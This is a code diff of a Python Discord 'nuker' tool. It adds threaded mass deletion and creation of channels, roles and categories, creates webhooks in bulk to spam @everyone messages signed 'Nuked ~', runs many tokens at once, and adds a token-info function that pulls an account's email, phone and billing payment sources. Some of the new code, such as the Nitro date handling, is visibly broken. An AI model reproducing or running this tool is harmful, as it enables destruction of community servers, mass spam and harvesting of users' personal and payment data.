@@ -13,8 +13,8 @@ import pypresence
 import threading
 import hashlib
 import base64
-import validators
 import string
+import datetime
 
 from concurrent.futures import ThreadPoolExecutor
 
@@ -39,33 +39,15 @@ class URL:
     RAW_main_py = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/main.py"
     RAW_config_json = "https://raw.githubusercontent.com/reactxsw/react-nuker/main/config.json"
 
+    CdnURL = "https://cdn.discordapp.com/"
     Canary = "https://canary.discordapp.com/"
     DiscordWebsocket = "wss://gateway.discord.gg/?v=9&encoding=json"
+    WebhookBase = "https://discord.com/api/webhooks/"
     BaseURL = "https://discord.com/api/v9/"
     WebhookURL = "https://discord.com/api/webhooks/"
-    Proxy = {
-        "ProxyUrls": {
-            "ProxyScrape-Https": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=https",
-            "ProxyScrape-Http": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=http",
-            "ProxyScrape-Socks4": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=socks4",
-            "ProxyScrape-Socks5": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=socks5",
-            "ProxyScrape-All": "https://api.proxyscrape.com/?request=displayproxies&status=alive&proxytype=all",
-            "TheSpeedX-Socks5": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-            "TheSpeedX-Socks4": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
-            "TheSpeedX-Http": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-            "ShiftyTR-Http": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-            "ShiftyTR-Https": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
-            "ShiftyTR-All": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
-            "ShiftyTR-Socks4": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
-            "ShiftyTR-Socks5": "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
-            "Sunny9577-All": "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
-            "Hookzof-All": "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
-            "Clarketm-All": "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
-        }
-    }
 
 class Constant:
-    CheckForUpdate = True
+    CheckForUpdate = False
     RPC = True
     Space= " "*19
     Blank = "_"*37
@@ -109,7 +91,6 @@ class Constant:
     CLIENT_ID = "794921074768216126"
     LARGE_IMAGE = "smilewinlogo"
     IP_ADDR = socket.gethostbyname(socket.gethostname())
-    os.system("title Disocrd Nuker BY REACT#1120 ^| Loading...")
 
 
     if pathlib.Path("tokens.txt").exists():
@@ -176,55 +157,6 @@ class Status:
         lock.acquire()
         print(f"{Constant.Space}{Colour.BRIGHT}{Colour.MAGENTA}[{Colour.WHITE}RATELIMIT{Colour.MAGENTA}] {Text}")
         lock.release()
-
-class ProxyIP:
-
-    ProxyURL = URL.Proxy["ProxyUrls"].items()
-    def GetProxies():
-        ProxyList = []
-        URL = 0 
-        HTTP = 0
-        HTTPS = 0
-        SOCKS4 = 0
-        SOCKS5 = 0
-        os.system("title Disocrd Nuker BY REACT#1120 ^| Scraping Proxies...")
-        for Provider, Url in ProxyIP.ProxyURL:
-            Proxies = requests.get(Url).text.split("\n")
-            URL = URL +1 
-
-            for Proxy in Proxies:
-                Proxy = Proxy.strip()
-
-                if Proxy not in ProxyList:
-                    Type = Provider.split("-")[1]
-
-                    if Type == "Http":
-                        ProxyList.append(f"http://{Proxy}")
-                        HTTP = HTTP + 1 
-                    
-                    elif Type == "Https":
-                        ProxyList.append(f"https://{Proxy}")
-                        HTTPS = HTTPS + 1 
-                    
-                    elif Type == "Socks4":
-                        ProxyList.append(f"socks4://{Proxy}")
-                        SOCKS4 = SOCKS4 + 1 
-                    
-                    elif Type == "Socks5":
-                        ProxyList.append(f"socks5://{Proxy}")
-                        SOCKS5 = SOCKS5 + 1 
-                    
-                    else:
-                        pass
-        os.system(f"title Disocrd Nuker BY REACT#1120 ^| Successfully Scraped {len(ProxyList):,} Proxies")               
-        print(f"""
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {len(ProxyList):,}{' '*(7-(len(str(len(ProxyList)))))}Proxies was scraped from {URL} urls 
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(HTTP):,}{' '*(7-(len(str(HTTP))))}HTTP 
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(HTTPS):,}{' '*(7-(len(str(HTTPS))))}HTTPS 
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(SOCKS4):,}{' '*(7-(len(str(SOCKS4))))}socks4 
-{Constant.Space}{Colour.WHITE}[{Colour.CYAN}>{Colour.WHITE}]{Colour.WHITE} {(SOCKS5):,}{' '*(7-(len(str(SOCKS5))))}socks5""")
-        
-        return ProxyList
 
 class Function:
     def ConvertImgToBase64(Image):
@@ -352,31 +284,8 @@ class ReqHeader:
         UA = ReqHeader.UserAgent()
         if requests.get(f"{URL.BaseURL}users/@me", headers={"Authorization": Constant.TOKEN}).status_code == 200:
             return {
-                "accept": "*/*",
-                "accept-encoding": "gzip, deflate, br",
-                "accept-language": "en-US",
                 "authorization": f"{Constant.TOKEN}",
                 "user-agent": f"{UA}",
-                "Sec-Fetch-Dest": "empty",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Site": "same-origin",
-                "x-debug-options": "bugReporterEnabled",
-                "x-super-properties": base64.b64encode(str({
-                        "os": "Windows",
-                        "browser": "Chrome",
-                        "device": "",
-                        "system_locale": "en-US",
-                        "browser_user_agent": f"{UA}",
-                        "browser_version": "91.0.4472.101",
-                        "os_version": "10",
-                        "referrer": f"https://discord.com/register",
-                        "referring_domain": "",
-                        "referrer_current": "",
-                        "referring_domain_current": "",
-                        "release_channel": "stable",
-                        "client_build_number": 87598,
-                        "client_event_source": None
-                    }).encode()).decode()
                 }
         else:
             return {
@@ -384,6 +293,31 @@ class ReqHeader:
                 }
 
 class Data:
+    def GetTokenInfo():
+        if Constant.TOKEN is not False:
+            CC_Digits = {
+                'american express': '3',
+                'visa': '4',
+                'mastercard': '5'
+            }
+            response  = requests.get(f"{URL.BaseURL}users/@me",headers= ReqHeader.DiscordHeader())
+            print(response.json())
+            if response.status_code in Status.SuccessStatus:
+                Userid = response.json()["id"]
+                Username = f'{response.json()["username"]}#{response.json()["discriminator"]}'
+                Email = response.json()["email"]
+                Phone = response.json()["phone"]
+                Language = response.json()["locale"]
+                AvatarURL = f'{URL.CdnURL}avatars{Userid}/{response.json()["avatar"]}.webp'
+                subscription = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=ReqHeader.DiscordHeader()).json()
+                nitro = bool(len(subscription) > 0)
+                if nitro:
+                    NitroEnd = datetime.strptime(subscription[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                    NitroStart = datetime.strptime(subscription[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
+                    NitroLeft = abs((NitroStart - NitroEnd).days)
+                Billing = requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=ReqHeader.DiscordHeader()).json()
+                print(Billing)
+                print(f"{Constant.Space}")
 
     def GetChannel_ID():
         if Constant.TOKEN is not False:
@@ -485,30 +419,64 @@ class Discord:
                         "custom_status": {
                             "text": Text}
                             })
-                    
-    def SendWebhook(Webhook_URL, Message,Proxy):
+    
+    def DeleteWebhook(ChannelID):
+        response = requests.get(f"{URL.BaseURL}channels/{ChannelID}/webhooks").json()
+        webhook = []
+        if len(response) > 1:
+            for i , items in enumerate(response):
+                    webhook.append(f'{URL.WebhookBase}{items["id"]}/{items["token"]}')
+
+        while len(webhook) < 10:
+            response = requests.post(f"{URL.BaseURL}channels/{ChannelID}/webhooks",headers=ReqHeader.DiscordHeader(),
+                json = {
+                    "name":"React"
+                }).json()
+            webhook.append(f'{URL.WebhookBase}{response["id"]}/{response["token"]}')
+        print(webhook)
+
+    def SendWebhook(Webhook_URL, Message):
         try:
             response =  requests.post(Webhook_URL, headers={
-                "content-type": "application/json",
-                "user-agent": f"{ReqHeader.UserAgent()}"
+                "content-type": "application/json"
                 },
-                    json={
-                        "content" : Message if Message != "" else "@everyone",
-                        "username" : "REACT",
-                        "avatar_url": "https://avatars.githubusercontent.com/u/70201574?v=4"
-                    },
-                        proxies={
-                            "http" : Proxy, "https" : Proxy
-                            })
-
+                json={
+                    "content": "@everyone",
+                    "embeds": [{
+                        "title": "React Server Nuker",
+                        "description": f"@everyone\n\n> {Message}",
+                        "color": random.randint(0, 16777215),
+                        "author": {
+                                "name": "React Server Nuker",
+                                "url": "https://smilewindiscord-th.web.app/joindiscord.html",
+                                "icon_url": "https://avatars.githubusercontent.com/u/70201574?v=4"
+                            },
+                            "footer": {
+                                "text": "Nuked ~",
+                                "icon_url": "https://avatars.githubusercontent.com/u/70201574?v=4"
+                            },
+                            "timestamp": f"{str(datetime.datetime.utcnow())}",
+                            "image": {
+                                "url": "https://avatars.githubusercontent.com/u/70201574?v=4"
+                            },
+                            "thumbnail": {
+                                "url": "https://avatars.githubusercontent.com/u/70201574?v=4"
+                            }
+                        }
+                    ]
+                }
+            )
             if response.status_code in Status.SuccessStatus:
-                Status.Success(f"MESSAGE SENT")
+                Status.Success(f"Webhook sent")
             
-            else:
-                Status.Fail(f"MESSAGE NOT SENT")
+            elif response.status_code == 429:
+                Status.Ratelimit(f"Ratelimited")
 
-        except:
-            pass
+            else:
+                Status.Fail(f"Unable to send")
+
+        except Exception as e:
+            print(e)
     
     def CreateRole(RoleName):
         response = requests.post(f"{URL.BaseURL}guilds/{Constant.SERVER_ID}/roles", headers=ReqHeader.DiscordHeader(), json={
@@ -575,8 +543,12 @@ class Discord:
             response = requests.delete(f"{URL.BaseURL}channels/{ChannelID}", headers=ReqHeader.DiscordHeader())
             if response.status_code in Status.SuccessStatus:
                 Status.Success(f"Deleted Channel {ChannelID}")
+            
+            elif response.status_code == 429:
+                Status.Ratelimit("Ratelimit")
+
             else:
-                print(f"Couldn't Delete Channel {ChannelID}")
+                Status.Fail(f"Couldn't Delete Channel {ChannelID}")
         except:
             pass
     
@@ -740,11 +712,52 @@ class Discord:
             except Exception:
                 break
 
-    def Online(token):
+    def Online(Token,Type,Game):
         ws = websocket.WebSocket()
         ws.connect(URL.DiscordWebsocket)
         RECV = json.loads(ws.recv())
         heartbeat_interval = RECV['d']['heartbeat_interval']
+        Status = {
+            1 :  {
+                        "name": Game,
+                        "type": 0
+                    },
+            2 : {
+                        "name": Game,
+                        "type": 1,
+                        "url": "https://www.twitch.tv/soulless.cc"
+                    },
+                
+            3 : {
+                        "name": Game,
+                        "type": 2
+                    },
+                
+            4 : {
+                        "name": Game,
+                        "type": 3
+                    }
+            }
+
+        ws.send(json.dumps({
+            "op":2,
+            "d": {
+                "token":Token,
+                "properties": {
+                    "$os":"windows",
+                    "$browser":"Discord",
+                    "$device": "desktop" 
+                },
+                "presence": {
+                    "game": Status[Type],
+                    "status": "online",
+                    "since":0,
+                    "afk":False
+                }
+            },
+            "s":None,
+            "t":None
+        }))
         while True:
             time.sleep(heartbeat_interval/1000)
             try:
@@ -825,7 +838,8 @@ class Discord:
             ["th","Thai"],
             ["tr","Turkish"],
             ["uk","Ukrainian"],       
-            ["vi","Vietnamese"]]
+            ["vi","Vietnamese"]
+        ]
         while True:
             for Language in Languages:
                 response = requests.patch(f"{URL.Canary}api/v9/users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
@@ -845,8 +859,6 @@ class Discord:
                 if response.status_code in Status.SuccessStatus:
                     Status.Success(f"Theme changed to {Theme}")
 
-        
-
 class ThreadFunction:
 
     def Channel_ID():
@@ -860,37 +872,101 @@ class ThreadFunction:
 
     def ThreadChangeChannelName():
         Channels = Data.GetChannel_ID()
-        
-    def ThreadSpamWebhook(ProxyList):
-        Threads =[] 
-        while True:
-            Webhook_url = input(f"{Colour.YELLOW}{Constant.Space}Webhook URL : ")
-            if URL.WebhookURL in Webhook_url and requests.get(Webhook_url).status_code == 200 and validators.url(Webhook_url):
-                break
-                
-            else:
-                print("Invalid Webhook URL")
+    
+    def ThreadCreateRole():
+        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
+            threads_create = [] 
+            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
+            Name = input(f"{Constant.Space}{Colour.YELLOW}")
+            with ThreadPoolExecutor(max_workers=Num) as executor:
+                for i in range(Num):
+                    time.sleep(0.025)
+                    threads_create.append(executor.submit(Discord.CreateRole,Name,))
+    
+    def ThreadDeleteRole():
+        if Constant.TOKEN is not False:
+            Roles = Data.GetRole_ID()
+            threads_create = [] 
+            with ThreadPoolExecutor(max_workers=len(Roles)) as executor:
+                for Role in Roles:
+                    threads_create.append(executor.submit(Discord.DeleteRole,Role,))
 
-        Message = input(">")
+    def ThreadCreateCategory():
+        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
+            threads_create = [] 
+            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
+            Name = input(f"{Constant.Space}{Colour.YELLOW}")
+            with ThreadPoolExecutor(max_workers=Num) as executor:
+                for i in range(Num):
+                    time.sleep(0.025)
+                    threads_create.append(executor.submit(Discord.CreateCategory,Name,))
+    
+    def ThreadCreateVoice():
+        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
+            threads_create = [] 
+            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
+            Name = input(f"{Constant.Space}{Colour.YELLOW}")
+            with ThreadPoolExecutor(max_workers=Num) as executor:
+                for i in range(Num):
+                    time.sleep(0.025)
+                    threads_create.append(executor.submit(Discord.CreateVoiceChannel,Name,))
+            
+    def ThreadCreateChannel():
+        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
+            threads_create = [] 
+            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
+            Name = input(f"{Constant.Space}{Colour.YELLOW}")
+            with ThreadPoolExecutor(max_workers=Num) as executor:
+                for i in range(Num):
+                    time.sleep(0.025)
+                    threads_create.append(executor.submit(Discord.CreateChannel,Name,))
+            
+    def ThreadDeleteChannel():
+        if Constant.TOKEN is not False:
+            Channels = Data.GetChannel_ID()
+            threads_create = [] 
+            with ThreadPoolExecutor(max_workers=len(Channels)) as executor:
+                for Channel in Channels:
+                    threads_create.append(executor.submit(Discord.DeleteChannel,Channel,))
 
-        while True:
-            try:
-                for i in range(int(input(">"))):
-                    Proxy = random.choice(ProxyList)
-                    print(f"[{i}] {Proxy}")
-                    t = threading.Thread(target=Discord.SendWebhook, args=(Webhook_url,Message,Proxy))
-                    Threads.append(t)
-                
-                for Thread in Threads:
-                    Thread.start()
+    def ThreadSpamWebhook():
+        ChannelID = input(f"{Constant.Space}{Colour.YELLOW}Channel ID :")
+        response = requests.get(f"{URL.BaseURL}channels/{ChannelID}/webhooks",headers=ReqHeader.DiscordHeader())
+        webhooks = []
+        if response.status_code in Status.SuccessStatus:
+            if len(response.json()) > 1:
+                for i in range(len(response.json())):
+                    print(response.json()[i])
+                    webhooks.append(f'{URL.WebhookBase}{response.json()[i]["id"]}/{response.json()[i]["token"]}')
+            while len(webhooks) < 10:
+                response = requests.post(f"{URL.BaseURL}channels/{ChannelID}/webhooks",headers=ReqHeader.DiscordHeader(),
+                    json = {
+                        "name":"React"
+                    })
+                webhooks.append(f'{URL.WebhookBase}{response.json()["id"]}/{response.json()["token"]}')
 
-                for Thread in Threads:
-                    Thread.join()
-                
-                break 
+            Threads =[] 
+            Message = input(f"{Constant.Space}{Colour.YELLOW}>")
 
-            except ValueError:
-                print("Number of thread should only be an integer")
+            while True:
+                try:
+                    
+                    for i in range(int(input(f"{Constant.Space}{Colour.YELLOW}>"))):
+                        for webhook in webhooks:
+                            t = threading.Thread(target=Discord.SendWebhook, args=(webhook,Message))
+                            Threads.append(t)
+                    
+                    for Thread in Threads:
+                        Thread.start()
+                        time.sleep(0.65)
+
+                    for Thread in Threads:
+                        Thread.join()
+                    
+                    break 
+
+                except ValueError:
+                    print("Number of thread should only be an integer")
 
     def ThreadKick():
         if Constant.TOKEN is True and Constant.SERVER_ID is True:
@@ -990,7 +1066,7 @@ class ThreadFunction:
     def ThreadLivestream():
         if not Constant.SERVER_ID is True:
 
-            VOICE_ID = input(f"{Colour.YELLOW}{Constant.Space}Voice channel ID : ")
+            VOICE_ID = input(f"{Constant.Space}{Colour.YELLOW}Voice channel ID : ")
             threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                 for token in Constant.TOKENS:
@@ -1002,7 +1078,7 @@ class ThreadFunction:
     def ThreadConnect():
         if not Constant.SERVER_ID is True:
 
-            VOICE_ID = input(f"{Constant.Space}Voice channel ID : ")
+            VOICE_ID = input(f"{Constant.Space}{Colour.YELLOW}Voice channel ID : ")
             threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                 for token in Constant.TOKENS:
@@ -1013,16 +1089,17 @@ class ThreadFunction:
 
     def ThreadOnline():
         if not Constant.SERVER_ID is True:
+            Type = int(input(f"{Constant.Space}{Colour.YELLOW}Type : "))
+            Game = input(f"{Constant.Space}{Colour.YELLOW}Game : ")
             threads_create = [] 
             with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                 for token in Constant.TOKENS:
-                    threads_create.append(executor.submit(Discord.Online,token))
+                    threads_create.append(executor.submit(Discord.Online,token,Type,Game))
         else:
             print("")
 
 class Main:
 
-    NEEDPROXY = [9]
     FunctionDict = {
         1: [ThreadFunction.Channel_ID,"Scrape Channels","Scrape Channels"], 
         2: [ThreadFunction.Member_ID,"Scrape Members","Scrape Members"],
@@ -1036,13 +1113,13 @@ class Main:
         10: [ThreadFunction.ThreadConnect,"Connect","เข้าห้องเสียง"], 
         11: [ThreadFunction.ThreadOnline,"Online","ขึ้นสถานะ Online"],
         12: [ThreadFunction.ThreadLivestream,"Livestream","ไลฟ์สตรีม"],
-        13: [Discord.CreateChannel,"Create Channels","สร้างห้องเเชท"],
-        14: [Discord.DeleteChannel,"Delete Channels","ลบห้อง"],
+        13: [ThreadFunction.ThreadCreateChannel,"Create Channels","สร้างห้องเเชท"],
+        14: [ThreadFunction.ThreadDeleteChannel,"Delete Channels","ลบห้อง"],
         15: [Discord.ChangeChannelName,"Channel Name","เเก้ชื่อห้อง"],
-        16: [Discord.CreateCategory,"Create Category","สร้างหมวดหมู่"],
-        17: [Discord.CreateVoiceChannel,"Create Voice","สร้างห้องเสียง"],
-        18: [Discord.CreateRole,"Create Role","สร้างยศ"],
-        19: [Discord.DeleteRole,"Delete Role","ลบยศ"],
+        16: [ThreadFunction.ThreadCreateCategory,"Create Category","สร้างหมวดหมู่"],
+        17: [ThreadFunction.ThreadCreateVoice,"Create Voice","สร้างห้องเสียง"],
+        18: [ThreadFunction.ThreadCreateRole,"Create Role","สร้างยศ"],
+        19: [ThreadFunction.ThreadDeleteRole,"Delete Role","ลบยศ"],
         20: [Discord.ChangeRoleName,"Change Role","เปลี่ยนชื่ยศ"],
         21: ["","Change Nickname","Change Nickname"],
         22: ["","Server Name","Server Name"],
@@ -1055,44 +1132,40 @@ class Main:
         29: [Discord.ChangeStatus,"Change Status","เปลี่ยนสถานะ"],
         30: ["","Login Token","Login Token"],
         31: ["","Nuke Server","Nuke Server"],
-        32: ["","",""],
+        32: [Data.GetTokenInfo,"Token Info",""],
         33: ["","",""],
         34: ["","",""],
         35: ["","",""],
         36: [exit,"Exit","ออก"]
     }
 
-    def run(Proxy= None, Run =False):
+    def run(Run =False):
         if Function.CheckInternet() is True:
             Function.DiscordRPC()
             Function.Clear()
             Function.Menu()
+            os.system("title Disocrd Nuker BY REACT#1120 ^| Ready")
             if Run is False:
-                Stat , Respond =Update.CheckUpdate(Constant.CheckForUpdate)
+                if Constant.CheckForUpdate is True:
+                    Stat , Respond =Update.CheckUpdate(Constant.CheckForUpdate)
 
-                if Stat == "UPDATE" and Respond.upper() in ["Y","YES"]:
-                    Update.UpdateProgram()
-            
+                    if Stat == "UPDATE" and Respond.upper() in ["Y","YES"]:
+                        Update.UpdateProgram()
+                else:
+                    pass
             Function.Clear()
             Function.Menu()
-            if Proxy is None:
-                Proxy = ProxyIP.GetProxies()
             while True:
                 try:    
                     Choice = int(input(f"{Constant.Space}{Colour.YELLOW}ROOT{Colour.WHITE}@{Colour.YELLOW}REACT>> {Colour.WHITE}"))
-                    if Choice in Main.NEEDPROXY:
-                        Main.FunctionDict[Choice][0](Proxy)
-                    
-                    else:
-                        Main.FunctionDict[Choice][0]()
-
-                    if input(f"{Constant.Space}CONTINUE ? [ Y/N ] ").upper() in ["Y","YES"]:
-                        Main.run(Proxy = Proxy,Run=True)
+                    Main.FunctionDict[Choice][0]()
+                    if input(f"{Constant.Space}{Colour.YELLOW}CONTINUE ? [ Y/N ] ").upper() in ["Y","YES"]:
+                        Main.run(Run=True)
                         break
                     
                     else:
-                        Main.FunctionDict[32][0]()
-                
+                        Main.FunctionDict[36][0]()
+
                 except (ValueError, KeyError) as e:
                     Status.Fail("Invalid choice")
 
@@ -1101,9 +1174,15 @@ class Main:
             print(f"{Constant.Space}{Colour.RED}No Internet Connection")
 
 def start(START=False):
+    title = ''
+    for char in "Disocrd Nuker BY REACT#1120 ^| Loading...": 
+        title = title + char
+        os.system(f'title {title}')
+
     if START is True:
         Function.Spinner()
         try:
+            os.system("title Disocrd Nuker BY REACT#1120 ^| Loading...")
             Main.run()
         except Exception as e:
             print(e)
